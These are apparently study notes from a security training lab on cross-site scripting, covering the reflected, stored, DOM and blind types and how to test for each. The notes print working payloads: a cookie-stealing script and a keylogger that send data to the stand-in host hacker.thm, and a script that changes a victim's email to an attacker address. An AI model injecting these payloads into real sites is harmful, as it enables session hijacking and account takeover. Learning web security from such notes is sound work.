# Cross Site Scripting
Is an injection attack where malicious javascript gets injected into a web app with intension of being executed by other users.


The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).

**Proof Of Concept:**

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

`<script>alert('XSS');</script>`

**Session Stealing:**

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`  

**Key Logger:**

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details. 

`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

**Business Logic:**

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

`<script>user.changeEmail('attacker@hacker.thm');</script>`

Now that the email address for the account has changed, the attacker may perform a reset password attack.


Reflected XSS
- Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

**How to test for Reflected XSS:**  

You'll need to test every possible point of entry; these include:

-   Parameters in the URL Query String
-   URL File Path
-   Sometimes HTTP Headers (although unlikely exploitable in practice)

Stored CSS
- As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.
- For example: A blog website that allows users to post comments.

**How to test for Stored XSS:**  

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:  

-   Comments on a blog
-   User profile information  
-   Website Listings

DOM XSS

- DOM stands for **D**ocument **O**bject **M**odel and is a programming interface for HTML and XML documents.
-  It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source.
- DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

**How to test for Dom Based XSS:**

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "**window.location.x**" parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as **eval()**.

Blind XSS
- Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.
- **How to test for Blind XSS:**

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

  

A popular tool for Blind XSS attacks is [xsshunter](https://xsshunter.com/). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.
